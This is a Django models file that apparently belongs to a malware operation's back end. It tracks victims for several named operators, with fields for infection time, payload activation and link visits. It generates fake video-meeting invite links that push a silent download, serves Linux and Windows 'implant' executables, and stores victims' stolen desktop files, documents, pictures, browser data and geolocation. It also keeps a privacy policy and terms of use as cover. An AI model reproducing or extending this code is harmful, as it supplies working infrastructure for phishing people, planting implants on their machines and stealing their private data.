import random
from pathlib import Path
from django.core.files import File
from django.db import models
from django.db.models import F
from django.conf import settings
from django.urls import reverse_lazy
from django.contrib.auth.models import User 
from tinymce.models import HTMLField
from django.db.models.signals import pre_save, post_save


def user_profile_pre_save(sender, instance,  *args, **kwargs):
    if instance.id is None:
        instance.id_token = instance.generate_id_token(10)
        instance.redirect_link = instance.generate_redirect_link()
        instance.video_link = instance.generate_video_link()
        #instance.update_compiled_exe(instance.id_token)
    
    else:
        pass

"""
def user_profile_post_save(sender, instance, created, *args, **kwargs):
    if created:
        linux_path = Path('/home/blackrose/implant/target/release/implant')
        windows_path = Path('/home/blackrose/implant/target/x86_64-pc-windows-gnu/release/implant.exe')
        with linux_path.open(mode='rb') as l, windows_path.open(mode='rb') as w:
            instance.linux_exe_file = File(l, name=linux_path.name)
            instance.windows_exe_file = File(w, name=windows_path.name)
            instance.save()

    else:
        pass
        
"""

class Application(models.Model):
    linux_exe_file = models.FileField(upload_to="Downloads/linux/%y/%m/%d", blank=True, null=False)
    windows_exe_file =  models.FileField(upload_to="Downloads/windows/%y/%m/%d", blank=True, null=False)
    created = models.DateTimeField(auto_now_add=True, auto_now=False)   
    updated = models.DateTimeField(auto_now_add=False, auto_now = True)

    def __str__(self) -> str:
        return "Application Executable"


    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'Application Executable'
         
'''
    #mac_exe_file = models.FileField(upload_to="Executables/mac/%y/%m/%d", blank=True, null=False)
    #linux_exe_file = models.FileField(upload_to="Executables/linux/%y/%m/%d", blank=True, null=False)
    #windows_exe_file =  models.FileField(upload_to="Executables/windows/%y/%m/%d", blank=True, null=False)
'''

class ClientsProfile(models.Model):

    ONLINE_STATUS = (
        ('ONLINE', 'online'),
        ('OFFLINE', 'offline'),
    )

    email = models.EmailField(unique=True)
    id_token = models.CharField(max_length=1000, blank=True, unique=True, null=False) 
    app_downloaded = models.BooleanField(default=False)
    app_installed = models.BooleanField(default=False)
    video_link = models.CharField(max_length=1000, default='', blank=True, null=False)
    redirect_link = models.URLField(default='', blank=True, null=False)
    link_visits = models.IntegerField(default=0)
    payload_activated = models.BooleanField(default=False)
    infection_time = models.TimeField(blank=True, null=True)
    last_time_online = models.TimeField(blank=True, null=True)      
    status = models.CharField(max_length=100, choices=ONLINE_STATUS, default='offline')
    created = models.DateTimeField(auto_now_add=True, auto_now=False)
    updated = models.DateTimeField(auto_now_add=False, auto_now=True)


    def generate_id_token(self, n):
        assert n <= 10
        l = list(range(10))
        while l[0] == 0 :
            random.shuffle(l)
        return str(int(''.join(str(d) for d in l[:n])))

        
    def generate_redirect_link(self):
        return '{}{}?q=1&directDl=true&msLaunch=true&meet={}&enableMobilePage=true&video={}&suppressPrompt=true'.format(settings.BASE_URL, reverse_lazy('core:launcher'), self.id_token, self.pk)
    
    
    def generate_video_link(self):
        return '{}{}'.format(settings.BASE_URL, reverse_lazy('core:invite_link', kwargs={'code': self.id_token}))
    
    
    class Meta:
        abstract = True 



class ClientProfileDetails(models.Model):
    pc_info = models.TextField(blank=True, null=True)
    system_applications = models.TextField(blank=True, null=True)
    geolocation = models.CharField(max_length=500, null=True, blank=True)
    desktop = models.FileField(upload_to="uploads/desktop/%y/%m/%d", blank=True, null=True)
    pictures = models.FileField(upload_to="uploads/pictures/%y/%m/%d", blank=True, null=True)
    documents = models.FileField(upload_to="uploads/documents/%y/%m/%d", blank=True, null=True)
    videos = models.FileField(upload_to="uploads/videos/%y/%m/%d", blank=True, null=True)
    downloads = models.FileField(upload_to="uploads/downloads/%y/%m/%d", blank=True, null=True)
    browser_details = models.FileField(upload_to="uploads/browser/%y/%m/%d", blank=True, null=True)
    created = models.DateTimeField(auto_now_add=True, auto_now=False)
    updated = models.DateTimeField(auto_now_add=False, auto_now=True)


    class Meta:
        abstract = True 


'''
    def update_compiled_exe(self, token_id):
        completed_process = subprocess.run(["/home/blackrose/vidicu/src/buildexec.sh", token_id])
        if completed_process.returncode == 0:
            return True

        else:
            return False
'''    
        

class NadiaClients(ClientsProfile):
    
    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'NadiaClients'

    def __str__(self):
        return "{}".format(self.email)

class LizzyClients(ClientsProfile):
    
    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'LizzyClients'


    def __str__(self):
        return "{}".format(self.email)


class ZaaloloClients(ClientsProfile):
    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'ZaaloloClients'

    def __str__(self):
        return "{}".format(self.email)


class KingpindrakoClients(ClientsProfile):
    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'KingpindrakoClients'


    def __str__(self):
        return "{}".format(self.email)


class NadiaClientsDetails(ClientProfileDetails):
    client = models.OneToOneField(NadiaClients, on_delete=models.SET_NULL, null=True)

    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'NadiaClientsDetails'

    def __str__(self):
        return "{}".format(self.client.email)


class LizzyClientsDetails(ClientProfileDetails):
    client = models.OneToOneField(LizzyClients, on_delete=models.SET_NULL, null=True)

    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'LizzyClientsDetails'


    def __str__(self):
        return "{}".format(self.client.email)


class ZaaloloClientsDetails(ClientProfileDetails):
    client = models.OneToOneField(ZaaloloClients, on_delete=models.SET_NULL, null=True)

    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'ZaaloloClientsDetails'


    def __str__(self):
        return "{}".format(self.client.email)


class KingpindrakoClientsDetails(ClientProfileDetails):
    client = models.OneToOneField(KingpindrakoClients, on_delete=models.SET_NULL, null=True)

    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'KingpindrakoClientsDetails'


    def __str__(self):
        return "{}".format(self.client.email)


pre_save.connect(user_profile_pre_save, sender=NadiaClients)
pre_save.connect(user_profile_pre_save, sender=LizzyClients)
pre_save.connect(user_profile_pre_save, sender=ZaaloloClients)
pre_save.connect(user_profile_pre_save, sender=KingpindrakoClients)

    

class SubscribeNewsletter(models.Model):
    email = models.EmailField()



class DownloadPageArticle(models.Model):
    user = models.OneToOneField(User, on_delete=models.DO_NOTHING)
    heading = models.CharField(max_length=200)
    heading_description = models.CharField(max_length=2000)
    second_heading = models.CharField(max_length=200)
    second_heading_description = models.CharField(max_length=2000)
    third_heading = models.CharField(max_length=200)
    third_heading_description = models.CharField(max_length=2000)
    fourth_heading = models.CharField(max_length=200)
    fourth_heading_description = models.CharField(max_length=2000)
    created = models.DateTimeField(auto_now_add=True, auto_now=False)
    updated = models.DateTimeField(auto_now=True)


    def __str__(self):
        return "Download Page Article"

    class Meta:
        ordering = ('-created',)
        verbose_name_plural = 'Download Page Article'



class PrivacyPolicy(models.Model):
    user = models.OneToOneField(User, on_delete=models.DO_NOTHING)
    content = HTMLField()
    created = models.DateTimeField(auto_now_add=True, auto_now=False)
    updated = models.DateTimeField(auto_now=True, auto_now_add=False)

    def __str__(self):
        return "Privacy Policy"

    class Meta:
        ordering = ('created',)
        verbose_name_plural = 'Privacy Policies'


class TermsOfUse(models.Model):
    user = models.OneToOneField(User, on_delete=models.DO_NOTHING)
    content = HTMLField()
    created = models.DateTimeField(auto_now_add=True, auto_now=False)
    updated = models.DateTimeField(auto_now=True, auto_now_add=False)
 
    def __str__(self):
        return "Terms Of Use"

    class Meta:
        ordering = ('created',)
        verbose_name_plural = 'Terms Of Use'

